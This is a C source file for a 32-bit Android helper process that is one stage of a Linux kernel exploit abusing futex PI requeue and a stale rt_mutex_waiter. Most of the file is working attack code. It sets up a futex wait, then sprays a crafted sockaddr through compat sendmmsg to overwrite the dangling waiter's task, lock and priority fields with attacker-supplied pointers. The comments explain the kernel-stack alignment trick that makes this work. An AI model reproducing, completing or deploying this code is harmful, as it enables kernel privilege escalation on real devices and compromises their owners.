/* waiter32.c -- 32-bit AArch32 waiter helper for the ghostlock 5.4 overlay.
 *
 * Compiled as armv7a-linux-androideabi, runs as a separate process.
 * Invokes sendmmsg through the compat socketcall(2) path, which adds a
 * 0x80-byte frame (vs 0x10 for native __arm64_sys_sendmmsg). That extra
 * depth shifts the sockaddr_storage 0x70 bytes deeper on the kernel stack,
 * placing waiter->task/lock/prio on sockaddr bytes instead of iovstack
 * iov_base fields (which fail access_ok for kernel pointers).
 *
 * Communication with the 64-bit main process is through a shared-memory
 * page passed as fd 3 (inherited across fork+exec). Layout:
 *   [0x000] uint32_t state          -- waiter lifecycle state
 *   [0x004] uint32_t waiter_pid     -- written by waiter after setup
 *   [0x008] int32_t  futex_ret      -- futex return value
 *   [0x00c] int32_t  sock_fd        -- STREAM sender fd (inherited)
 *   [0x010] uint64_t fake_task      -- overlay: waiter.task value
 *   [0x018] uint64_t fake_lock      -- overlay: waiter.lock value
 *   [0x020] int32_t  prio           -- overlay: waiter.prio value
 *   [0x024] int32_t  core           -- CPU to pin to
 *   [0x028] uint32_t owner_started  -- set by main when owner holds pi_target
 *   [0x02c] uint32_t owner_chain    -- set by main when owner has chain lock
 *   [0x100] uint32_t f_wait         -- the WAIT futex word
 *   [0x200] uint32_t f_pi_target    -- the PI target futex word
 *   [0x300] uint32_t f_pi_chain     -- the chain futex word
 *
 * States: 0=init, 1=waiter ready (chain locked), 2=waiter waiting,
 *         3=sigusr1 received, 4=overlay blocking, 5=overlay returned,
 *         0xfe=exiting, 0xff=error
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/net.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

#define SHM_STATE         0x000
#define SHM_WAITER_PID    0x004
#define SHM_FUTEX_RET     0x008
#define SHM_SOCK_FD       0x00c
#define SHM_FAKE_TASK     0x010
#define SHM_FAKE_LOCK     0x018
#define SHM_PRIO          0x020
#define SHM_CORE          0x024
#define SHM_OWNER_STARTED 0x028
#define SHM_OWNER_CHAIN   0x02c
#define SHM_F_WAIT        0x100
#define SHM_F_PI_TARGET   0x200
#define SHM_F_PI_CHAIN    0x300
#define SHM_SIZE          0x1000

#define SHM_FD 3

static volatile uint8_t *shm;

static uint32_t shm_r32(int off) {
    return __atomic_load_n((volatile uint32_t *)(shm + off), __ATOMIC_ACQUIRE);
}
static void shm_w32(int off, uint32_t v) {
    __atomic_store_n((volatile uint32_t *)(shm + off), v, __ATOMIC_RELEASE);
}
static uint64_t shm_r64(int off) {
    uint64_t lo = __atomic_load_n((volatile uint32_t *)(shm + off),
                                  __ATOMIC_ACQUIRE);
    uint64_t hi = __atomic_load_n((volatile uint32_t *)(shm + off + 4),
                                  __ATOMIC_ACQUIRE);
    return lo | (hi << 32);
}

static long futex_op(uint32_t *uaddr, int op, uint32_t val,
                     const struct timespec *timeout, uint32_t *uaddr2,
                     uint32_t val3) {
    return syscall(__NR_futex, uaddr, op, val, timeout, uaddr2, val3);
}

#ifndef __NR_socketcall
#define __NR_socketcall 102
#endif
#define SOCK_SENDMMSG 20

static void sigusr1_handler(int sig) {
    (void)sig;
    shm_w32(SHM_STATE, 3);

    int sock_fd = (int)shm_r32(SHM_SOCK_FD);
    uint64_t fake_task = shm_r64(SHM_FAKE_TASK);
    uint64_t fake_lock = shm_r64(SHM_FAKE_LOCK);
    int32_t prio = (int32_t)shm_r32(SHM_PRIO);

    /* Build the sockaddr overlay (128 bytes).
     * Mapping (from HANDOVER section 18):
     *   sockaddr[0x00] = W+0x28 pi_tree.rb_left   = 0
     *   sockaddr[0x08] = W+0x30 task               = fake_task
     *   sockaddr[0x10] = W+0x38 lock               = fake_lock
     *   sockaddr[0x18] = W+0x40 prio               = prio value */
    uint8_t overlay[128];
    memset(overlay, 0, sizeof(overlay));
    memcpy(overlay + 0x08, &fake_task, 8);
    memcpy(overlay + 0x10, &fake_lock, 8);
    memcpy(overlay + 0x18, &prio, 4);

    static char sdata[64];
    memset(sdata, 0x41, sizeof(sdata));

    struct iovec siov[8];
    siov[0].iov_base = sdata;
    siov[0].iov_len = sizeof(sdata);
    for (int i = 1; i < 8; i++) {
        siov[i].iov_base = NULL;
        siov[i].iov_len = 0;
    }

    struct mmsghdr mmsg;
    memset(&mmsg, 0, sizeof(mmsg));
    mmsg.msg_hdr.msg_name = overlay;
    mmsg.msg_hdr.msg_namelen = sizeof(overlay);
    mmsg.msg_hdr.msg_iov = siov;
    mmsg.msg_hdr.msg_iovlen = 8;

    unsigned long args[4];
    args[0] = (unsigned long)sock_fd;
    args[1] = (unsigned long)&mmsg;
    args[2] = 1;
    args[3] = 0;

    shm_w32(SHM_STATE, 4);

    syscall(__NR_socketcall, SOCK_SENDMMSG, args);

    shm_w32(SHM_STATE, 5);
}

int main(void) {
    shm = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, SHM_FD, 0);
    if (shm == MAP_FAILED)
        _exit(1);

    int core = (int)shm_r32(SHM_CORE);
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* Block all signals except SIGUSR1 */
    sigset_t blocked;
    sigfillset(&blocked);
    sigdelset(&blocked, SIGUSR1);
    sigprocmask(SIG_SETMASK, &blocked, NULL);

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigusr1_handler;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGUSR1, &sa, NULL);

    volatile uint32_t *f_chain = (volatile uint32_t *)(shm + SHM_F_PI_CHAIN);
    if (futex_op((uint32_t *)f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        _exit(2);

    shm_w32(SHM_WAITER_PID, (uint32_t)getpid());
    shm_w32(SHM_STATE, 1);

    while (!shm_r32(SHM_OWNER_STARTED)) {
        struct timespec ts = {0, 1000000};
        nanosleep(&ts, NULL);
    }

    volatile uint32_t *f_wait = (volatile uint32_t *)(shm + SHM_F_WAIT);
    volatile uint32_t *f_pi = (volatile uint32_t *)(shm + SHM_F_PI_TARGET);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 30;

    shm_w32(SHM_STATE, 2);

    int ret = (int)futex_op((uint32_t *)f_wait, FUTEX_WAIT_REQUEUE_PI,
                            0, &timeout, (uint32_t *)f_pi, 0);
    shm_w32(SHM_FUTEX_RET, (uint32_t)ret);

    struct timespec settle = {.tv_sec = 2, .tv_nsec = 0};
    nanosleep(&settle, NULL);

    futex_op((uint32_t *)f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    while (!shm_r32(SHM_OWNER_CHAIN)) {
        struct timespec ts = {0, 1000000};
        nanosleep(&ts, NULL);
    }

    shm_w32(SHM_STATE, 0xfe);
    _exit(0);
}
